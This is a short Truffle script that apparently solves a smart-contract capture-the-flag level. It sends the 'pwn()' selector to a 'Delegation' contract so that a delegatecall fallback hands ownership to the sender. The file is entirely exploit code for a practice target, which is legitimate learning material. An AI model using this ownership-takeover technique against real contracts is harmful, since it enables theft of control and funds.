//0x3EbFBB071283CfdD760A827316d627BeABBAcefc

const Delegation = artifacts.require("Delegation");

module.exports = async (callback) => {
  //console.log(Delegation.web3.eth.sendTransaction);
  const web3 = Delegation.web3;
  try {
    const accounts = await web3.eth.getAccounts();
    const delegationAddress = "0x3EbFBB071283CfdD760A827316d627BeABBAcefc";
    const msgData = web3.eth.abi.encodeFunctionSignature("pwn()");
    console.log("Sending transaction with msg data:", msgData);

    await web3.eth.sendTransaction({
      from: accounts[0],
      to: delegationAddress,
      data: msgData,
      gasLimit: "1000000"
    });

    console.log("done.");
  } catch (err) {
    console.log("Oops: ", err.message);
  }

  callback();
};
